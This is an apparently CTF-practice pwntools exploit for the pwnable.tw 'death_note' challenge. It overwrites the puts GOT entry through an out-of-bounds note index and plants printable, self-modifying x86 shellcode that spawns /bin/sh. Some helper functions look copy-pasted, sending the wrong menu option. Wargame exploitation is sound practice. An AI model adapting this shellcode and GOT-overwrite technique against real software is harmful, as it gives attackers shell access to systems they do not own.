from pwn import *

locdbg=False
slpt=0.3

host='chall.pwnable.tw'
port=10201
filename='./death_note'
elf=ELF(filename)

if locdbg:
    p=process(filename)
    context.log_level='debug'
else:
    p=remote(host,port)
    #context.log_level='debug'

def pwndbg():
    if locdbg:
        gdb.attach(p)

def slp():
    if not locdbg:
        sleep(slpt)

def fin():
    p.interactive()

def ad(idx,ctt):
    p.recvuntil(b'choice :')
    p.sendline(b'1')
    slp()
    p.recvuntil(b'Index :')
    p.sendline(str(idx).encode())
    slp()
    p.recvuntil(b'Name :')
    p.send(ctt)
    slp()

def prt(idx):
    p.recvuntil(b'choice :')
    p.sendline(b'1')
    slp()
    p.recvuntil(b'Index :')
    p.sendline(str(idx).encode())
    slp()

def dlt(idx):
    p.recvuntil(b'choice :')
    p.sendline(b'1')
    slp()
    p.recvuntil(b'Index :')
    p.sendline(str(idx).encode())
    slp()

def printable(ctt):
    for i in ctt:
        if(u8(i)<=31 or u8(i)==127):
            return 0

note_0=0x0804a060
puts_idx=(elf.got['puts']-note_0)//4

print(puts_idx)

shellcode = '''
    /* execve(path='/bin///sh', argv=0, envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx
   /*rewrite shellcode to get 'int 80'*/
    push edx
    pop eax
    push 0x60606060
    pop edx
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x35] , dl
    sub byte ptr[eax + 0x34] , dl
    push 0x3e3e3e3e
    pop edx
    sub byte ptr[eax + 0x34] , dl
    /*set zero to edx*/
    push ecx
    pop edx
   /*set 0x0b to eax*/
    push edx
    pop eax
    xor al, 0x40
    xor al, 0x4b    
  /*foo order,for holding the  place*/
    push edx
    pop edx
    push edx
    pop edx
'''
shellcode = asm(shellcode) + b'\x6b\x40'
print(len(shellcode))
pwndbg()
ad(puts_idx,shellcode)
fin()